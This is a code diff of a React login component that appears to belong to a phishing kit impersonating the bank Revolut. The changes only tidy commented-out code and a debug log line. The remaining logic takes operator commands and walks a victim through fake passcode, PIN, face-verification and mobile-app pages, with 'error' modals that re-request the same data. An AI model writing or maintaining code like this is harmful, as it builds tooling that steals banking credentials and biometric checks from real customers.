@@ -107,49 +107,22 @@ export default function LoginForm() {
             displayErrorModal('phone'); // Show error modal for phone number
         } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
             navigateWithLoader('/PasswordPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
-            //     router.push('/PasswordPage');
-            // }, 2500);
         } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
             displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PIN') {
             navigateWithLoader('/PasswordPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO PIN PAGE");
-            //     router.push('/PasswordPage');
-            // }, 2500);
         } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PIN");
             displayErrorModal('pin'); // Show error modal for pin
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
             navigateWithLoader('/FaceVerificationPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
-            //     // displayPageLoader();
-            //     // router.push('/FaceVerificationPage');
-            // }, 2500);
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
             // displayErrorModal('face_verification'); // Show error modal for face verification
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
             displayAuthModal()
-            // navigateWithLoader('/MobileAuthPAge');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
-            //     router.push('/MobileAuthPAge');
-            // }, 500);
         } else if (command === 'FINISH') {
             navigateWithLoader('/verificationPage');
-            // displayPageLoader();
-            // setTimeout(() => {
-            //     resetCommand();
-            //     router.push('/verificationPage');
-            // }, 2500);
         }
     }, [command, router, commandCounter]);
 
@@ -271,7 +244,7 @@ export default function LoginForm() {
             router.push('/AppleAuthPage');
         }
     };
-    console.log("MobileAuthModal props: in login page", { displayAuth, setDisplayAuth: typeof setDisplayAuth, resetCommand: typeof resetCommand });
+    
     const stableSetDisplayAuth = useCallback(
     (value) => setDisplayAuth(value),
     [] // Empty dependency = never changes
